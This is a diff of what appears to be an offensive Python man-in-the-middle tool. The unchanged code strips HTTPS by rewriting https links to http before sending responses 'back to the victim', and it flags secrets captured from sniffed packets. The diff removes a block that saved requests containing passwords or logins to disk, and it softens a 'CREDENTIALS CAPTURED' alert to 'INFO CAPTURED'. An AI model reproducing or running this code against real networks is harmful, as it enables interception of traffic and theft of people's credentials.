@@ -172,24 +172,8 @@ def handle_client_connection(client_socket):
                 
                 # 4. CRITICAL STRIP: Rewrite all https:// links to http://
                 stripped_response = response_data.replace(b'https://', b'http://')
-                
-                # 5. Log sensitive data found in the REQUEST
-                if b"password" in request_data.lower() or b"login" in request_data.lower():
-                    pkt_id = str(uuid.uuid4())
-                    # Save the raw request data for later viewing
-                    with open(f"{CAPTURE_DIR}/{pkt_id}.html", "wb") as f:
-                        f.write(request_data) 
-                        
-                    STATUS["intercepted_data"].append({
-                        "id": pkt_id,
-                        "time": time.strftime('%H:%M:%S'),
-                        "src": "SSL_STRIP", "dst": host,
-                        "snippet": f"[SSL STRIP DATA] {request_data[:100]}",
-                        "type": "ALERT"
-                    })
-                    log_msg(f"[ALERT] SSL STRIP: Potential Creds found for {host}")
 
-                # 6. Send stripped response back to the victim
+                # 5. Send stripped response back to the victim
                 client_socket.sendall(stripped_response)
 
     except Exception: pass
@@ -257,7 +241,7 @@ def packet_callback(packet):
                 if is_sensitive:
                     snippet = f"[SECRET] {captured_secret[:80]}"
                     log_type = "ALERT"
-                    log_msg(f"[ALERT] CREDENTIALS CAPTURED from {src}")
+                    log_msg(f"[ALERT] INFO CAPTURED from {src}")
                 elif is_html:
                     snippet = f"[HTML] Captured Page Source ({len(payload)} bytes)"
                     log_type = "HTML"
